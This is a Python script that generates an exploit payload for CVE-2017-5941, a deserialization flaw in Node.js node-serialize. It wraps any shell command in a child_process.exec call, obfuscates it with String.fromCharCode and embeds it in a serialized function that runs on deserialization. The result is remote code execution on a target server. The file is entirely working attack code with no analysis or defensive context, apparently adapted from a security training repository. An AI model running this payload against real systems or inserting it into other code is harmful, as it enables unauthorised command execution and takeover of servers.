#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Based on:  https://github.com/hoainam1989/training-application-security/blob/master/shell/node_shell.py
Target URL example:  http://<RHOST>:<RPORT>
"""

EXEC_FUNCTION = '''\
require('child_process').exec('%s', function(error, stdout, stderr) {
    console.log(error)
    console.log(stdout)
})\
'''


def genPayload(cmd):
	"""CVE-2017-5941."""
	payload = EXEC_FUNCTION % cmd
	payload = _encodeString(payload)
	payload = '{"run":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % payload

	return payload


def _encodeString(string):
	string_encoded = ''
	for char in string:
		string_encoded += ',' + str(ord(char))

	return string_encoded[1:]
